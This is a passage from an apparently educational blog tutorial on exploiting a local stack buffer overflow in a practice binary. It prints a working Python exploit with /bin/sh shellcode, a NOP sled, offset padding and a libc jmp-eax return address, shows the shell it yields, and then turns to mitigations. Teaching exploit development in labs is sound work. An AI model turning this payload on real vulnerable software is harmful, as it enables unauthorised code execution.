+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp1.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf7d5f000</span>
+</span></span><span style="display:flex;"><span>jmp_eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00024fe3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e"># 10 NOPS</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># /bin/sh shellcode</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(payload)) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload += &#34;BBBB&#34; # EIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,libc_base<span style="color:#f92672">+</span>jmp_eax) <span style="color:#75715e"># EIP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>With this updated exploit, running the command will lead us to a shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./exp1 <span style="color:#66d9ef">$(</span>./exp1.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>core  exp1  exp1.c  exp1.py
+</span></span></code></pre></div><p>Now we can see that we successfully achieved shell! 🎉💻✨</p>
+<p>You might be wondering, &ldquo;Why aren&rsquo;t there any mitigations for attacks like this?&rdquo; 🤔 The good news is that there are several security mitigations in place! 🛡️ Let’s dive into some of the most common ones, one by one. This way, we can better understand how they work to protect against these types of vulnerabilities and keep our systems safe! 🚀</p>
+
     </div>
 </div>
 </main>
